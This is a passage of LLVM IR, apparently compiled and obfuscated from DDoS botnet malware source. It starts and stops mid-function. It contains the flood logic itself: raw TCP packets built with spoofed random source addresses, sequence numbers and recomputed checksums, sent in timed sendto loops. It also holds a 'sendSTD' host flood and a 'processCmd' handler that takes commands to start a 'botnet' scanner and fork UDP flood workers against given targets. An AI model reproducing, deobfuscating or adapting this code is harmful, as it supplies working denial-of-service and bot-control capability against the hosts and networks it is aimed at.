  %321 = xor i16 %320, -1
  %322 = or i16 12184, %312
  %323 = and i16 %321, %322
  %324 = or i16 %319, %323
  %325 = or i16 %308, 256
  store i16 %324, i16* %304, align 4
  br label %388

; <label>:326:                                    ; preds = %296
  %327 = load i8*, i8** %23, align 8
  %328 = call i32 @strcmp(i8* %327, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.124, i32 0, i32 0)) #9
  %329 = icmp ne i32 %328, 0
  br i1 %329, label %348, label %330

; <label>:330:                                    ; preds = %326
  %331 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %332 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %331, i32 0, i32 0
  %333 = bitcast %union.anon* %332 to %struct.anon.0*
  %334 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %333, i32 0, i32 4
  %335 = load i16, i16* %334, align 4
  %336 = xor i16 %335, -1
  %337 = xor i16 -4097, -1
  %338 = xor i16 -6867, -1
  %339 = or i16 %336, %337
  %340 = or i16 -6867, %338
  %341 = xor i16 %339, -1
  %342 = and i16 %341, %340
  %343 = and i16 %335, -4097
  %344 = and i16 %342, 4096
  %345 = xor i16 %342, 4096
  %346 = or i16 %344, %345
  %347 = or i16 %342, 4096
  store i16 %346, i16* %334, align 4
  br label %387

; <label>:348:                                    ; preds = %326
  %349 = load i8*, i8** %23, align 8
  %350 = call i32 @strcmp(i8* %349, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.125, i32 0, i32 0)) #9
  %351 = icmp ne i32 %350, 0
  br i1 %351, label %382, label %352

; <label>:352:                                    ; preds = %348
  %353 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %354 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %353, i32 0, i32 0
  %355 = bitcast %union.anon* %354 to %struct.anon.0*
  %356 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %355, i32 0, i32 4
  %357 = load i16, i16* %356, align 4
  %358 = xor i16 %357, -1
  %359 = xor i16 -2049, -1
  %360 = xor i16 30705, -1
  %361 = or i16 %358, %359
  %362 = or i16 30705, %360
  %363 = xor i16 %361, -1
  %364 = and i16 %363, %362
  %365 = and i16 %357, -2049
  %366 = xor i16 %364, -1
  %367 = xor i16 2048, -1
  %368 = xor i16 -2086, -1
  %369 = and i16 %366, -2086
  %370 = and i16 %364, %368
  %371 = and i16 %367, -2086
  %372 = and i16 2048, %368
  %373 = or i16 %369, %370
  %374 = or i16 %371, %372
  %375 = xor i16 %373, %374
  %376 = or i16 %366, %367
  %377 = xor i16 %376, -1
  %378 = or i16 -2086, %368
  %379 = and i16 %377, %378
  %380 = or i16 %375, %379
  %381 = or i16 %364, 2048
  store i16 %380, i16* %356, align 4
  br label %386

; <label>:382:                                    ; preds = %348
  %383 = load i32, i32* @KadenCommStock, align 4
  %384 = load i8*, i8** %23, align 8
  %385 = call i32 (i32, i8*, ...) @botnetPrint(i32 %383, i8* getelementptr inbounds ([18 x i8], [18 x i8]* @.str.126, i32 0, i32 0), i8* %384)
  br label %386

; <label>:386:                                    ; preds = %382, %352
  br label %387

; <label>:387:                                    ; preds = %386, %330
  br label %388

; <label>:388:                                    ; preds = %387, %300
  br label %389

; <label>:389:                                    ; preds = %388, %266
  br label %390

; <label>:390:                                    ; preds = %389, %248
  %391 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.120, i32 0, i32 0)) #3
  store i8* %391, i8** %23, align 8
  br label %241

; <label>:392:                                    ; preds = %241
  br label %393

; <label>:393:                                    ; preds = %392, %140
  %394 = call i32 @rand_cmwc()
  %395 = trunc i32 %394 to i16
  %396 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %397 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %396, i32 0, i32 0
  %398 = bitcast %union.anon* %397 to %struct.anon.0*
  %399 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %398, i32 0, i32 5
  store i16 %395, i16* %399, align 2
  %400 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %401 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %400, i32 0, i32 0
  %402 = bitcast %union.anon* %401 to %struct.anon.0*
  %403 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %402, i32 0, i32 6
  store i16 0, i16* %403, align 4
  %404 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %405 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %404, i32 0, i32 0
  %406 = bitcast %union.anon* %405 to %struct.anon.0*
  %407 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %406, i32 0, i32 7
  store i16 0, i16* %407, align 2
  %408 = load i32, i32* %9, align 4
  %409 = icmp eq i32 %408, 0
  br i1 %409, label %410, label %412

; <label>:410:                                    ; preds = %393
  %411 = call i32 @rand_cmwc()
  br label %417

; <label>:412:                                    ; preds = %393
  %413 = load i32, i32* %9, align 4
  %414 = trunc i32 %413 to i16
  %415 = call zeroext i16 @htons(i16 zeroext %414) #10
  %416 = zext i16 %415 to i32
  br label %417

; <label>:417:                                    ; preds = %412, %410
  %418 = phi i32 [ %411, %410 ], [ %416, %412 ]
  %419 = trunc i32 %418 to i16
  %420 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %421 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %420, i32 0, i32 0
  %422 = bitcast %union.anon* %421 to %struct.anon.0*
  %423 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %422, i32 0, i32 1
  store i16 %419, i16* %423, align 2
  %424 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %425 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %426 = call zeroext i16 @tcpcsum(%struct.iphdr* %424, %struct.tcphdr* %425)
  %427 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %428 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %427, i32 0, i32 0
  %429 = bitcast %union.anon* %428 to %struct.anon.0*
  %430 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %429, i32 0, i32 6
  store i16 %426, i16* %430, align 4
  %431 = bitcast i8* %89 to i16*
  %432 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %433 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %432, i32 0, i32 2
  %434 = load i16, i16* %433, align 2
  %435 = zext i16 %434 to i32
  %436 = call zeroext i16 @csum(i16* %431, i32 %435)
  %437 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %438 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %437, i32 0, i32 7
  store i16 %436, i16* %438, align 2
  %439 = call i64 @time(i64* null) #3
  %440 = load i32, i32* %10, align 4
  %441 = sext i32 %440 to i64
  %442 = sub i64 0, %439
  %443 = sub i64 0, %441
  %444 = add i64 %442, %443
  %445 = sub i64 0, %444
  %446 = add nsw i64 %439, %441
  %447 = trunc i64 %445 to i32
  store i32 %447, i32* %24, align 4
  store i32 0, i32* %25, align 4
  br label %448

; <label>:448:                                    ; preds = %502, %501, %417
  br label %449

; <label>:449:                                    ; preds = %448
  %450 = load i32, i32* %17, align 4
  %451 = bitcast %struct.sockaddr_in* %16 to %struct.sockaddr*
  %452 = call i64 @sendto(i32 %450, i8* %89, i64 %86, i32 0, %struct.sockaddr* %451, i32 16)
  %453 = load i32, i32* %19, align 4
  %454 = call i32 @GRIP(i32 %453)
  %455 = call i32 @htonl(i32 %454) #10
  %456 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %457 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %456, i32 0, i32 8
  store i32 %455, i32* %457, align 4
  %458 = call i32 @rand_cmwc()
  %459 = trunc i32 %458 to i16
  %460 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %461 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %460, i32 0, i32 3
  store i16 %459, i16* %461, align 4
  %462 = call i32 @rand_cmwc()
  %463 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %464 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %463, i32 0, i32 0
  %465 = bitcast %union.anon* %464 to %struct.anon.0*
  %466 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %465, i32 0, i32 2
  store i32 %462, i32* %466, align 4
  %467 = call i32 @rand_cmwc()
  %468 = trunc i32 %467 to i16
  %469 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %470 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %469, i32 0, i32 0
  %471 = bitcast %union.anon* %470 to %struct.anon.0*
  %472 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %471, i32 0, i32 0
  store i16 %468, i16* %472, align 4
  %473 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %474 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %473, i32 0, i32 0
  %475 = bitcast %union.anon* %474 to %struct.anon.0*
  %476 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %475, i32 0, i32 6
  store i16 0, i16* %476, align 4
  %477 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %478 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %479 = call zeroext i16 @tcpcsum(%struct.iphdr* %477, %struct.tcphdr* %478)
  %480 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %481 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %480, i32 0, i32 0
  %482 = bitcast %union.anon* %481 to %struct.anon.0*
  %483 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %482, i32 0, i32 6
  store i16 %479, i16* %483, align 4
  %484 = bitcast i8* %89 to i16*
  %485 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %486 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %485, i32 0, i32 2
  %487 = load i16, i16* %486, align 2
  %488 = zext i16 %487 to i32
  %489 = call zeroext i16 @csum(i16* %484, i32 %488)
  %490 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %491 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %490, i32 0, i32 7
  store i16 %489, i16* %491, align 2
  %492 = load i32, i32* %25, align 4
  %493 = load i32, i32* %15, align 4
  %494 = icmp eq i32 %492, %493
  br i1 %494, label %495, label %502

; <label>:495:                                    ; preds = %449
  %496 = call i64 @time(i64* null) #3
  %497 = load i32, i32* %24, align 4
  %498 = sext i32 %497 to i64
  %499 = icmp sgt i64 %496, %498
  br i1 %499, label %500, label %501

; <label>:500:                                    ; preds = %495
  br label %508

; <label>:501:                                    ; preds = %495
  store i32 0, i32* %25, align 4
  br label %448

; <label>:502:                                    ; preds = %449
  %503 = load i32, i32* %25, align 4
  %504 = add i32 %503, -1224465304
  %505 = add i32 %504, 1
  %506 = sub i32 %505, -1224465304
  %507 = add i32 %503, 1
  store i32 %506, i32* %25, align 4
  br label %448

; <label>:508:                                    ; preds = %500
  %509 = load i8*, i8** %20, align 8
  call void @llvm.stackrestore(i8* %509)
  br label %510

; <label>:510:                                    ; preds = %508, %59, %51, %44
  ret void
}

; Function Attrs: nounwind readonly
declare i32 @strcmp(i8*, i8*) #5

; Function Attrs: nounwind
declare i8* @strtok(i8*, i8*) #1

; Function Attrs: noinline nounwind uwtable
define void @sendSTD(i8*, i32, i32) #0 {
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i64, align 8
  %9 = alloca %struct.sockaddr_in, align 4
  %10 = alloca %struct.hostent*, align 8
  %11 = alloca i32, align 4
  %12 = alloca [1 x i8*], align 8
  store i8* %0, i8** %4, align 8
  store i32 %1, i32* %5, align 4
  store i32 %2, i32* %6, align 4
  %13 = call i32 @socket(i32 2, i32 2, i32 0) #3
  store i32 %13, i32* %7, align 4
  %14 = call i64 @time(i64* null) #3
  store i64 %14, i64* %8, align 8
  %15 = load i8*, i8** %4, align 8
  %16 = call %struct.hostent* @gethostbyname(i8* %15)
  store %struct.hostent* %16, %struct.hostent** %10, align 8
  %17 = bitcast %struct.sockaddr_in* %9 to i8*
  call void @llvm.memset.p0i8.i64(i8* %17, i8 0, i64 16, i32 4, i1 false)
  %18 = load %struct.hostent*, %struct.hostent** %10, align 8
  %19 = getelementptr inbounds %struct.hostent, %struct.hostent* %18, i32 0, i32 4
  %20 = load i8**, i8*** %19, align 8
  %21 = getelementptr inbounds i8*, i8** %20, i64 0
  %22 = load i8*, i8** %21, align 8
  %23 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 2
  %24 = bitcast %struct.in_addr* %23 to i8*
  %25 = load %struct.hostent*, %struct.hostent** %10, align 8
  %26 = getelementptr inbounds %struct.hostent, %struct.hostent* %25, i32 0, i32 3
  %27 = load i32, i32* %26, align 4
  %28 = sext i32 %27 to i64
  call void @bcopy(i8* %22, i8* %24, i64 %28) #3
  %29 = load %struct.hostent*, %struct.hostent** %10, align 8
  %30 = getelementptr inbounds %struct.hostent, %struct.hostent* %29, i32 0, i32 2
  %31 = load i32, i32* %30, align 8
  %32 = trunc i32 %31 to i16
  %33 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 0
  store i16 %32, i16* %33, align 4
  %34 = load i32, i32* %5, align 4
  %35 = trunc i32 %34 to i16
  %36 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 1
  store i16 %35, i16* %36, align 2
  store i32 0, i32* %11, align 4
  br label %37

; <label>:37:                                     ; preds = %61, %3
  %38 = bitcast [1 x i8*]* %12 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* %38, i8* bitcast ([1 x i8*]* @sendSTD.hexstring to i8*), i64 8, i32 8, i1 false)
  %39 = load i32, i32* %11, align 4
  %40 = icmp uge i32 %39, 50
  br i1 %40, label %41, label %61

; <label>:41:                                     ; preds = %37
  %42 = load i32, i32* %7, align 4
  %43 = getelementptr inbounds [1 x i8*], [1 x i8*]* %12, i32 0, i32 0
  %44 = bitcast i8** %43 to i8*
  %45 = call i64 @send(i32 %42, i8* %44, i64 1460, i32 0)
  %46 = load i32, i32* %7, align 4
  %47 = bitcast %struct.sockaddr_in* %9 to %struct.sockaddr*
  %48 = call i32 @connect(i32 %46, %struct.sockaddr* %47, i32 16)
  %49 = call i64 @time(i64* null) #3
  %50 = load i64, i64* %8, align 8
  %51 = load i32, i32* %6, align 4
  %52 = sext i32 %51 to i64
  %53 = sub i64 0, %52
  %54 = sub i64 %50, %53
  %55 = add nsw i64 %50, %52
  %56 = icmp sge i64 %49, %54
  br i1 %56, label %57, label %60

; <label>:57:                                     ; preds = %41
  %58 = load i32, i32* %7, align 4
  %59 = call i32 @close(i32 %58)
  call void @_exit(i32 0) #12
  unreachable

; <label>:60:                                     ; preds = %41
  store i32 0, i32* %11, align 4
  br label %61

; <label>:61:                                     ; preds = %60, %37
  %62 = load i32, i32* %11, align 4
  %63 = add i32 %62, 125057012
  %64 = add i32 %63, 1
  %65 = sub i32 %64, 125057012
  %66 = add i32 %62, 1
  store i32 %65, i32* %11, align 4
  br label %37
                                                  ; No predecessors!
  ret void
}

; Function Attrs: noreturn
declare void @_exit(i32) #8

; Function Attrs: noinline nounwind uwtable
define void @processCmd(i32, i8**) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i8**, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i8*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca i8*, align 8
  %17 = alloca i8*, align 8
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i32, align 4
  %21 = alloca i8*, align 8
  %22 = alloca i32, align 4
  %23 = alloca i32, align 4
  %24 = alloca i8*, align 8
  %25 = alloca i8*, align 8
  %26 = alloca i32, align 4
  %27 = alloca i32, align 4
  %28 = alloca i8*, align 8
  %29 = alloca i32, align 4
  %30 = alloca i64, align 8
  store i32 %0, i32* %3, align 4
  store i8** %1, i8*** %4, align 8
  %31 = load i8**, i8*** %4, align 8
  %32 = getelementptr inbounds i8*, i8** %31, i64 0
  %33 = load i8*, i8** %32, align 8
  %34 = call i32 @strcmp(i8* %33, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.128, i32 0, i32 0)) #9
  %35 = icmp ne i32 %34, 0
  br i1 %35, label %74, label %36

; <label>:36:                                     ; preds = %2
  %37 = load i8**, i8*** %4, align 8
  %38 = getelementptr inbounds i8*, i8** %37, i64 1
  %39 = load i8*, i8** %38, align 8
  %40 = call i32 @strcmp(i8* %39, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.129, i32 0, i32 0)) #9
  %41 = icmp ne i32 %40, 0
  br i1 %41, label %49, label %42

; <label>:42:                                     ; preds = %36
  %43 = load i32, i32* @botnetPid, align 4
  %44 = icmp eq i32 %43, 0
  br i1 %44, label %45, label %46

; <label>:45:                                     ; preds = %42
  br label %553

; <label>:46:                                     ; preds = %42
  %47 = load i32, i32* @botnetPid, align 4
  %48 = call i32 @kill(i32 %47, i32 9) #3
  store i32 0, i32* @botnetPid, align 4
  br label %49

; <label>:49:                                     ; preds = %46, %36
  %50 = load i8**, i8*** %4, align 8
  %51 = getelementptr inbounds i8*, i8** %50, i64 1
  %52 = load i8*, i8** %51, align 8
  %53 = call i32 @strcmp(i8* %52, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.130, i32 0, i32 0)) #9
  %54 = icmp ne i32 %53, 0
  br i1 %54, label %73, label %55

; <label>:55:                                     ; preds = %49
  %56 = load i32, i32* @botnetPid, align 4
  %57 = icmp ne i32 %56, 0
  br i1 %57, label %58, label %59

; <label>:58:                                     ; preds = %55
  br label %553

; <label>:59:                                     ; preds = %55
  %60 = call i32 @fork() #3
  store i32 %60, i32* %5, align 4
  store i32 1000, i32* %6, align 4
  store i32 10, i32* %7, align 4
  %61 = load i32, i32* %5, align 4
  %62 = icmp ugt i32 %61, 0
  br i1 %62, label %63, label %65

; <label>:63:                                     ; preds = %59
  %64 = load i32, i32* %5, align 4
  store i32 %64, i32* @botnetPid, align 4
  br label %553

; <label>:65:                                     ; preds = %59
  %66 = load i32, i32* %5, align 4
  %67 = icmp eq i32 %66, -1
  br i1 %67, label %68, label %69

; <label>:68:                                     ; preds = %65
  br label %553

; <label>:69:                                     ; preds = %65
  br label %70

; <label>:70:                                     ; preds = %69
  %71 = load i32, i32* %7, align 4
  %72 = load i32, i32* %6, align 4
  call void @botnetTScan(i32 %71, i32 %72)
  call void @_exit(i32 0) #12
  unreachable

; <label>:73:                                     ; preds = %49
  br label %74

; <label>:74:                                     ; preds = %73, %2
  %75 = load i8**, i8*** %4, align 8
  %76 = getelementptr inbounds i8*, i8** %75, i64 0
  %77 = load i8*, i8** %76, align 8
  %78 = call i32 @strcmp(i8* %77, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.131, i32 0, i32 0)) #9
  %79 = icmp ne i32 %78, 0
  br i1 %79, label %223, label %80

; <label>:80:                                     ; preds = %74
  %81 = load i32, i32* %3, align 4
  %82 = icmp slt i32 %81, 6
  br i1 %82, label %134, label %83

; <label>:83:                                     ; preds = %80
  %84 = load i8**, i8*** %4, align 8
  %85 = getelementptr inbounds i8*, i8** %84, i64 3
  %86 = load i8*, i8** %85, align 8
  %87 = call i32 @atoi(i8* %86) #9
  %88 = icmp eq i32 %87, -1
  br i1 %88, label %134, label %89

; <label>:89:                                     ; preds = %83
  %90 = load i8**, i8*** %4, align 8
  %91 = getelementptr inbounds i8*, i8** %90, i64 2
  %92 = load i8*, i8** %91, align 8
  %93 = call i32 @atoi(i8* %92) #9
  %94 = icmp eq i32 %93, -1
  br i1 %94, label %134, label %95

; <label>:95:                                     ; preds = %89
  %96 = load i8**, i8*** %4, align 8
  %97 = getelementptr inbounds i8*, i8** %96, i64 4
  %98 = load i8*, i8** %97, align 8
  %99 = call i32 @atoi(i8* %98) #9
  %100 = icmp eq i32 %99, -1
  br i1 %100, label %134, label %101

; <label>:101:                                    ; preds = %95
  %102 = load i8**, i8*** %4, align 8
  %103 = getelementptr inbounds i8*, i8** %102, i64 5
  %104 = load i8*, i8** %103, align 8
  %105 = call i32 @atoi(i8* %104) #9
  %106 = icmp eq i32 %105, -1
  br i1 %106, label %134, label %107

; <label>:107:                                    ; preds = %101
  %108 = load i8**, i8*** %4, align 8
  %109 = getelementptr inbounds i8*, i8** %108, i64 5
  %110 = load i8*, i8** %109, align 8
  %111 = call i32 @atoi(i8* %110) #9
  %112 = icmp sgt i32 %111, 65536
  br i1 %112, label %134, label %113

; <label>:113:                                    ; preds = %107
  %114 = load i8**, i8*** %4, align 8
  %115 = getelementptr inbounds i8*, i8** %114, i64 5
  %116 = load i8*, i8** %115, align 8
  %117 = call i32 @atoi(i8* %116) #9
  %118 = icmp sgt i32 %117, 65500
  br i1 %118, label %134, label %119

; <label>:119:                                    ; preds = %113
  %120 = load i8**, i8*** %4, align 8
  %121 = getelementptr inbounds i8*, i8** %120, i64 4
  %122 = load i8*, i8** %121, align 8
  %123 = call i32 @atoi(i8* %122) #9
  %124 = icmp sgt i32 %123, 32
  br i1 %124, label %134, label %125

; <label>:125:                                    ; preds = %119
  %126 = load i32, i32* %3, align 4
  %127 = icmp eq i32 %126, 7
  br i1 %127, label %128, label %135

; <label>:128:                                    ; preds = %125
  %129 = load i8**, i8*** %4, align 8
  %130 = getelementptr inbounds i8*, i8** %129, i64 6
  %131 = load i8*, i8** %130, align 8
  %132 = call i32 @atoi(i8* %131) #9
  %133 = icmp slt i32 %132, 1
  br i1 %133, label %134, label %135

; <label>:134:                                    ; preds = %128, %119, %113, %107, %101, %95, %89, %83, %80
  br label %553

; <label>:135:                                    ; preds = %128, %125
  %136 = load i8**, i8*** %4, align 8
  %137 = getelementptr inbounds i8*, i8** %136, i64 1
  %138 = load i8*, i8** %137, align 8
  store i8* %138, i8** %8, align 8
  %139 = load i8**, i8*** %4, align 8
  %140 = getelementptr inbounds i8*, i8** %139, i64 2
  %141 = load i8*, i8** %140, align 8
  %142 = call i32 @atoi(i8* %141) #9
  store i32 %142, i32* %9, align 4
  %143 = load i8**, i8*** %4, align 8
  %144 = getelementptr inbounds i8*, i8** %143, i64 3
  %145 = load i8*, i8** %144, align 8
  %146 = call i32 @atoi(i8* %145) #9
  store i32 %146, i32* %10, align 4
  %147 = load i8**, i8*** %4, align 8
  %148 = getelementptr inbounds i8*, i8** %147, i64 4
  %149 = load i8*, i8** %148, align 8
  %150 = call i32 @atoi(i8* %149) #9
  store i32 %150, i32* %11, align 4
  %151 = load i8**, i8*** %4, align 8
  %152 = getelementptr inbounds i8*, i8** %151, i64 5
  %153 = load i8*, i8** %152, align 8
  %154 = call i32 @atoi(i8* %153) #9
  store i32 %154, i32* %12, align 4
  %155 = load i32, i32* %3, align 4
  %156 = icmp sgt i32 %155, 6
  br i1 %156, label %157, label %162

; <label>:157:                                    ; preds = %135
  %158 = load i8**, i8*** %4, align 8
  %159 = getelementptr inbounds i8*, i8** %158, i64 6
  %160 = load i8*, i8** %159, align 8
  %161 = call i32 @atoi(i8* %160) #9
  br label %163

; <label>:162:                                    ; preds = %135
  br label %163

; <label>:163:                                    ; preds = %162, %157
  %164 = phi i32 [ %161, %157 ], [ 1000, %162 ]
  store i32 %164, i32* %13, align 4
  %165 = load i32, i32* %3, align 4
  %166 = icmp sgt i32 %165, 7
  br i1 %166, label %167, label %172

; <label>:167:                                    ; preds = %163
  %168 = load i8**, i8*** %4, align 8
  %169 = getelementptr inbounds i8*, i8** %168, i64 7
  %170 = load i8*, i8** %169, align 8
  %171 = call i32 @atoi(i8* %170) #9
  br label %173

; <label>:172:                                    ; preds = %163
  br label %173

; <label>:173:                                    ; preds = %172, %167
  %174 = phi i32 [ %171, %167 ], [ 1000000, %172 ]
  store i32 %174, i32* %14, align 4
  %175 = load i32, i32* %3, align 4
  %176 = icmp sgt i32 %175, 8
  br i1 %176, label %177, label %182

; <label>:177:                                    ; preds = %173
  %178 = load i8**, i8*** %4, align 8
  %179 = getelementptr inbounds i8*, i8** %178, i64 8
  %180 = load i8*, i8** %179, align 8
  %181 = call i32 @atoi(i8* %180) #9
  br label %183

; <label>:182:                                    ; preds = %173
  br label %183

; <label>:183:                                    ; preds = %182, %177
  %184 = phi i32 [ %181, %177 ], [ 0, %182 ]
  store i32 %184, i32* %15, align 4
  %185 = load i8*, i8** %8, align 8
  %186 = call i8* @strstr(i8* %185, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.120, i32 0, i32 0)) #9
  %187 = icmp ne i8* %186, null
  br i1 %187, label %188, label %209

; <label>:188:                                    ; preds = %183
  %189 = load i8*, i8** %8, align 8
  %190 = call i8* @strtok(i8* %189, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.120, i32 0, i32 0)) #3
  store i8* %190, i8** %16, align 8
  br label %191

; <label>:191:                                    ; preds = %206, %188
  %192 = load i8*, i8** %16, align 8
  %193 = icmp ne i8* %192, null
  br i1 %193, label %194, label %208

; <label>:194:                                    ; preds = %191
  %195 = call i32 @listFork()
  %196 = icmp ne i32 %195, 0
  br i1 %196, label %206, label %197

; <label>:197:                                    ; preds = %194
  %198 = load i8*, i8** %16, align 8
  %199 = load i32, i32* %9, align 4
  %200 = load i32, i32* %10, align 4
  %201 = load i32, i32* %11, align 4
  %202 = load i32, i32* %12, align 4
  %203 = load i32, i32* %13, align 4
  %204 = load i32, i32* %14, align 4
  %205 = load i32, i32* %15, align 4
  call void @sendUDP(i8* %198, i32 %199, i32 %200, i32 %201, i32 %202, i32 %203, i32 %204, i32 %205)
  call void @_exit(i32 0) #12
  unreachable

; <label>:206:                                    ; preds = %194
  %207 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.120, i32 0, i32 0)) #3
  store i8* %207, i8** %16, align 8
  br label %191

; <label>:208:                                    ; preds = %191
  br label %222

; <label>:209:                                    ; preds = %183
  %210 = call i32 @listFork()
  %211 = icmp ne i32 %210, 0
  br i1 %211, label %221, label %212

; <label>:212:                                    ; preds = %209
  %213 = load i8*, i8** %8, align 8
  %214 = load i32, i32* %9, align 4
  %215 = load i32, i32* %10, align 4
  %216 = load i32, i32* %11, align 4
  %217 = load i32, i32* %12, align 4
  %218 = load i32, i32* %13, align 4
  %219 = load i32, i32* %14, align 4
  %220 = load i32, i32* %15, align 4
  call void @sendUDP(i8* %213, i32 %214, i32 %215, i32 %216, i32 %217, i32 %218, i32 %219, i32 %220)
  call void @_exit(i32 0) #12
  unreachable

; <label>:221:                                    ; preds = %209
  br label %222

; <label>:222:                                    ; preds = %221, %208
  br label %553

; <label>:223:                                    ; preds = %74
  %224 = load i8**, i8*** %4, align 8
  %225 = getelementptr inbounds i8*, i8** %224, i64 0
  %226 = load i8*, i8** %225, align 8
  %227 = call i32 @strcmp(i8* %226, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.132, i32 0, i32 0)) #9
  %228 = icmp ne i32 %227, 0
  br i1 %228, label %350, label %229

; <label>:229:                                    ; preds = %223
  %230 = load i32, i32* %3, align 4
  %231 = icmp slt i32 %230, 6
  br i1 %231, label %274, label %232

; <label>:232:                                    ; preds = %229
  %233 = load i8**, i8*** %4, align 8
  %234 = getelementptr inbounds i8*, i8** %233, i64 3
  %235 = load i8*, i8** %234, align 8
  %236 = call i32 @atoi(i8* %235) #9
  %237 = icmp eq i32 %236, -1
  br i1 %237, label %274, label %238

; <label>:238:                                    ; preds = %232
  %239 = load i8**, i8*** %4, align 8
  %240 = getelementptr inbounds i8*, i8** %239, i64 2
  %241 = load i8*, i8** %240, align 8
  %242 = call i32 @atoi(i8* %241) #9
  %243 = icmp eq i32 %242, -1
  br i1 %243, label %274, label %244

; <label>:244:                                    ; preds = %238
  %245 = load i8**, i8*** %4, align 8
  %246 = getelementptr inbounds i8*, i8** %245, i64 4
  %247 = load i8*, i8** %246, align 8
  %248 = call i32 @atoi(i8* %247) #9
  %249 = icmp eq i32 %248, -1
  br i1 %249, label %274, label %250

; <label>:250:                                    ; preds = %244
  %251 = load i8**, i8*** %4, align 8
  %252 = getelementptr inbounds i8*, i8** %251, i64 4
  %253 = load i8*, i8** %252, align 8
  %254 = call i32 @atoi(i8* %253) #9
  %255 = icmp sgt i32 %254, 32
  br i1 %255, label %274, label %256

; <label>:256:                                    ; preds = %250
  %257 = load i32, i32* %3, align 4
  %258 = icmp sgt i32 %257, 6
  br i1 %258, label %259, label %265

; <label>:259:                                    ; preds = %256
  %260 = load i8**, i8*** %4, align 8
  %261 = getelementptr inbounds i8*, i8** %260, i64 6
  %262 = load i8*, i8** %261, align 8
  %263 = call i32 @atoi(i8* %262) #9
  %264 = icmp slt i32 %263, 0
  br i1 %264, label %274, label %265

; <label>:265:                                    ; preds = %259, %256
  %266 = load i32, i32* %3, align 4
  %267 = icmp eq i32 %266, 8
  br i1 %267, label %268, label %275

; <label>:268:                                    ; preds = %265
  %269 = load i8**, i8*** %4, align 8
  %270 = getelementptr inbounds i8*, i8** %269, i64 7
  %271 = load i8*, i8** %270, align 8
  %272 = call i32 @atoi(i8* %271) #9
  %273 = icmp slt i32 %272, 1
  br i1 %273, label %274, label %275

; <label>:274:                                    ; preds = %268, %259, %250, %244, %238, %232, %229
  br label %553

; <label>:275:                                    ; preds = %268, %265
  %276 = load i8**, i8*** %4, align 8
  %277 = getelementptr inbounds i8*, i8** %276, i64 1
  %278 = load i8*, i8** %277, align 8
